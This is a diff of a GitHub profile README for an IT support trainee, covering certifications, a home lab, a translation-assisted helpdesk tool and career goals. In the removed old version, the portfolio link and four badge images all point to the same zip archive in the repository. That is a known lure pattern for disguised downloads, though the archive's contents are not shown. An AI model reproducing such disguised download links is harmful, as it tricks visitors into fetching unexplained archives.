@@ -1,84 +1,96 @@
-<h1 align="center">👋🏾 Hello, I'm Winfred Kofi Amoah, SysAdmin Trainee & IT Support Specialist</h1>
-
+<h1 align="center">Winfred Kofi Amoah</h1>
 <p align="center">
- Ghanaian | 🌍 Based in Moscow | 🎯 Target: Remote IT Support Specialist |
+  <strong>IT Support Specialist | Helpdesk Operations | Systems Administration</strong><br>
+  🌍 Based in Moscow | 🇬🇭 Ghanaian | 🎯 Target: Remote Technical Support / Helpdesk Role
 </p>
 
 ---
 
-### 💼 My IT Journey
+## What I Do
 
-I am an IT and IR student working and building my skills through steady lab work. I run a full home lab with Windows Server, Active Directory, DHCP, DNS, and client systems. I document each step on github, Freshdesk and Spiceworks and focus on clear troubleshooting. 
+I resolve technical issues through structured troubleshooting, ticket-based support, and workflow automation. I specialize in Windows environments, helpdesk systems, and multilingual support scenarios. My focus is **accurate diagnosis, fast resolution, and consistent operations**.
 
-I am completing the Google IT Support certificate and CompTIA A+ by December, 2025. I target IT Support and junior Systems Administrator roles where I apply these skills and grow through real work.
-
-
-
-| Icon | Area of Focus                           | Description                                                                                                                                                                                |
-| :--: | :-------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-|  🖥️ | **IT Support & Systems Administration** | Building expertise in **Active Directory (AD)**, **PowerShell Automation**, **Windows Server**, and core network troubleshooting.                                                          |
-|  🔧  | **Systems Automation**                  | Developing practical PowerShell scripts for user lifecycle management and system maintenance. Practicing enterprise IT scenarios in a **VirtualBox** home lab environment.                 |
-|  🎓  | **Academic Foundation**                 | Studied Information Technology at the University of Ghana, with a foundation in programming and databases. Currently leveraging problem-solving skills in International Relations studies. |
+Currently completing the **Google IT Support Professional Certificate** and **CompTIA A+**, with hands-on experience managing a full home lab environment.
 
 ---
 
-### 📈 Career Trajectory
+## 🚀 Featured Project: Multilingual AI Support System
 
-My immediate goal is to secure a part-time remote IT Support role by Day January 2026 while building a Systems Administrator profile.
+**Workflow automation tool for technical support teams handling Russian/English tickets.**
 
-| Status | Milestone                                     | Target Date / Outcome                      |
-| :----: | :-------------------------------------------- | :----------------------------------------- |
-|    ✅   | **Google IT Support Certificate**             | Expected January 2026                      |
-|   🔧   | **CompTIA A+ Certification**                  | Target Q1 2026 (Both Core 1 & Core 2)      |
-|   🖥️  | **Part-time Remote IT Support Role**          | Target: **January 2026**  |
-|   🛠️  | **CompTIA Security+ & Azure AZ-900**          | Q2/Q3 2026 (SysAdmin Target)         |
-|   🎯   | **Junior Systems Administrator**              | Target: August 2026       |
-|   🌐   | **Funded Master’s in IT/Information Systems** | Long-term goal (Target Fall 2030)          |
+**Purpose**  
+Reduce manual translation effort and improve first-draft quality for multilingual support.
 
----
+**Core Functions**
+- Translate Russian technical tickets into English using a controlled glossary for accuracy  
+- Retrieve relevant solutions from internal knowledge base  
+- Generate structured draft replies with root cause analysis and troubleshooting steps  
+- Human review before final response delivery
 
-### 🚀 Active Projects & Labs
+**Tech Stack**  
+React frontend, Python/FastAPI backend (planned), documentation-driven retrieval workflow
 
-My **[IT Portfolio](https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip)** documents my hands-on experience, with every lab logged as a formal support ticket in Freshdesk.
-
-| Project                        | Focus                                        | Skills Demonstrated                                                  |
-| :----------------------------- | :------------------------------------------- | :------------------------------------------------------------------- |
-| **IT Portfolio**               | Active Directory, PowerShell, Windows Server | Virtualization, Enterprise Service Management, Automation, Ticketing |
-| **Memory Saver App**           | Front-End & Manual QA Testing Practice       | HTML/CSS/JS, QA Documentation                                        |
-| **Modeling Portfolio Website** | Responsive Web Design                        | Personal Branding, Front-End Development                             |
-| **QA Test Cases**              | Manual Testing Documentation                 | Structured Documentation, Bug Reporting                              |
-| **Cleaning Service Website**              | Responsive Web Design, Booking, Deployment               |   Front-End Development, Problwm Solving                    |
+**Status**  
+Working prototype with documented workflow and mock API, designed for production deployment.
 
 ---
 
-### 🧰 Technical Skills
+## 📂 Technical Focus Areas
 
-| Category                           | Skills                                                                                                    |
-| :--------------------------------- | :-------------------------------------------------------------------------------------------------------- |
-| 🖥️ **Systems & Virtualization**   | **Windows Server 2022**, **Active Directory**, PowerShell, VirtualBox, Linux (Ubuntu/CentOS), BIOS/UEFI   |
-| 🌐 **Networking & Infrastructure** | **TCP/IP**, **DNS**, **DHCP**, OSI Model (L3/L4), VLANs, Subnetting, Ping/Traceroute                      |
-| 🔧 **IT Tools & Platforms**        | **Jira/Freshdesk/Spiceworks** (Ticketing), PowerShell ISE, GitHub, Windows Command Line (CMD), Azure AD (Conceptual) |
-| 💻 **Development Foundation**      | HTML5, CSS3, JavaScript, Git                                                                              |
-
----
-
-### 🌍 My Background & Value
-
-* **Global Perspective:** Born in Ghana, now studying International Relations at RUDN University, Moscow on a full scholarship.
-* **Process & Leadership:** Management experience in bakery and restaurant operations, developing core transferable skills in process improvement, de-escalation, and leadership.
-* **Confidence & Communication:** Modeling and acting experience, which translates directly into clear, confident communication for customer service.
+| Area | Skills & Expertise |
+|:---|:---|
+| **IT Support & Systems** | Active Directory, Windows Server 2022, PowerShell automation, VirtualBox virtualization |
+| **Helpdesk Operations** | Freshdesk/Spiceworks administration, ticket triage, escalation workflows, SLA management |
+| **Infrastructure** | TCP/IP, DNS, DHCP, BIOS/UEFI troubleshooting, OS deployment |
+| **Development** | React, HTML/CSS/JavaScript, Git/GitHub, workflow design |
 
 ---
 
-### 📫 Let's Connect
+## 🛠️ Active Home Lab
+
+- **Domain Controller:** Windows Server 2022 with AD DS, DNS, DHCP  
+- **Clients:** Windows 10/11 Pro workstations  
+- **Virtualization:** Oracle VirtualBox  
+- **ITSM:** Freshdesk with custom workflow configuration  
+- **Documentation:** All labs tracked via structured support tickets  
+
+**[View Detailed Portfolio →](https://github.com/Wkamoah/IT-Portfolio)**
+
+---
+
+## 📈 Career Trajectory
+
+| Status | Milestone | Target |
+|:---|:---|:---|
+| ✅ | Google IT Support Professional Certificate | Completed |
+| 🔄 | CompTIA A+ (Core 1 & 2) | 2026 |
+| 🎯 | Remote IT Support / Helpdesk Role | Jan 2026 |
+| 🎯 | Junior Systems Administrator | Near Future |
+
+---
+
+## 🌍 Background & Value
+
+**Global Perspective**  
+Born in Ghana, studying International Relations at RUDN University, Moscow on full scholarship. Multilingual capabilities, with Russian proficiency for technical support scenarios.
+
+**Transferable Experience**  
+Management roles in bakery and restaurant operations, developing process improvement, de-escalation, and team leadership skills.
+
+**Communication**  
+Modeling and acting experience enables **clear, confident, user-facing communication**, critical for helpdesk success.
+
+---
+
+## 📫 Connect
+
+- **Portfolio:** [github.com/Wkamoah/IT-Portfolio](https://github.com/Wkamoah/IT-Portfolio)  
+- **GitHub:** [@Wkamoah](https://github.com/Wkamoah)  
+- **Email:** [winfredkofiamoah@gmail.com]  
+- **LinkedIn:** [www.linkedin.com/in/winfred-kofi-amoah-6b9296397]  
+
+---
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip"><img src="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip" /></a>
-  <a href="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip"><img src="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip" /></a>
-  <a href="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip"><img src="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip" /></a>
-  <a href="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip"><img src="https://raw.githubusercontent.com/Wkamoah/Wkamoah/main/intranslatable/Wkamoah_2.7-alpha.5.zip" /></a>
-</p>
-
-<p align="center">
- 🎯 Open to IT Support, Helpdesk, and SysAdmin Apprenticeships.
+  <strong>Open to IT Support, Helpdesk, and Junior Systems Administration opportunities.</strong>
 </p>
